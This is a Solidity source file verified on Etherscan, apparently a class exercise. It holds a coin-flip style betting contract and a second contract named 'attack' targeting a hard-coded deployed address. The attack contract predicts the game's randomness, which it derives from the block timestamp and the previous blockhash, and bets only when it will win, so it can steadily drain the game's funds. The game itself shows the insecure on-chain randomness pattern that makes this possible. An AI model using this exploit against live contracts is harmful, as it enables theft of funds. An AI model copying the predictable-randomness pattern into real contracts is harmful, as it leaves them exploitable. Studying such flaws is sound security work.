/**
 *Submitted for verification at Etherscan.io on 2021-05-26
*/

pragma solidity ^0.4.26;

contract class_game{
    event win(address);
    address Owner;
    
    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(ramdon)%1000;
        
    }
    function play()public payable{
        require (msg.value == 0.01 ether);
        if(get_random()>=500){
            msg.sender.transfer(0.02 ether);
            emit win (msg.sender);
        }
    }
    function() public payable {
        require(msg.value==1 ether);
    }
    constructor() public payable{
        require (msg.value ==1 ether);
        Owner = msg.sender;
    }
    function querybalance()public view returns(uint){
        return address(this).balance;
    }
    function killcontract()public{
        require(msg.sender==0xbF788b242FdcCeb19c47703dd4A346971807B315);
        selfdestruct(Owner);
    }
}

contract attack{
    address public game= 0x956Bb43fC513146B76da62c544ab81173e946EEf;
    
    class_game gamecontract = class_game (game); //指定合約
    
    //亂數預測
    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(ramdon)%1000;
        
    }
    function atk()public payable{
        require (get_random()>=500);
        gamecontract.play.value(0.01 ether)();
    }
    function() public payable {
        
    }
    constructor() public payable{
        require (msg.value == 1 ether);
    }
}